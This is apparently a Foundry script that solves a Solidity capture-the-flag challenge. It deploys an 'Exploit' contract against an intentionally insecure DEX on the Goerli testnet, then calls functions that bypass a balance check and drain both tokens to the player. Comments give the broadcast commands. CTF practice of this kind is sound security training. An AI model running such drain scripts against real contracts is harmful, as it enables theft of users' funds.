// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/Challenge2.DEX.sol";
import "../test/Challenge2.t.sol";

// source .env && forge script script/Challenge2.s.sol:Challenge2Script --rpc-url $GOERLI_RPC_URL --broadcast --private-key $ETH_PRIV_KEY --etherscan-api-key $ETHERSCAN_API_KEY -vvvv
// source .env && forge script script/Challenge2.s.sol:Challenge2Script --fork-url $GOERLI_RPC_URL --private-key $ETH_PRIV_KEY -vvvv
contract Challenge2Script is Script {
    IERC20 token0 = IERC20(0x181Bc038CcaA0d094ca1fde0A870BE2ECDF36224);
    IERC20 token1 = IERC20(0x7Bf502773DA1f5daC36B2c1f2887572635619EFa);
    InsecureDexLP target = InsecureDexLP(0xDBacb53F0288F6864Fa1897De3E0D3d6aFb9a53c);
    address player;

    function setUp() public {
        player = tx.origin;
    }

    function run() public {
        vm.startBroadcast();
        
        Exploit exp = new Exploit(target, token0, token1, player);

        token0.transfer(address(exp), 1 ether);
        token1.transfer(address(exp), 1 ether);

        exp.bypassBalanceCheck();
        exp.doTheMagic();
        exp.steal();
        
        require(token0.balanceOf(player) == 10 ether, "Player should have 10 ether of token0");
        require(token1.balanceOf(player) == 10 ether, "Player should have 10 ether of token1");
        require(token0.balanceOf(address(target)) == 0, "Dex should be empty (token0)");
        require(token1.balanceOf(address(target)) == 0, "Dex should be empty (token1)");

        vm.stopBroadcast();
    }
}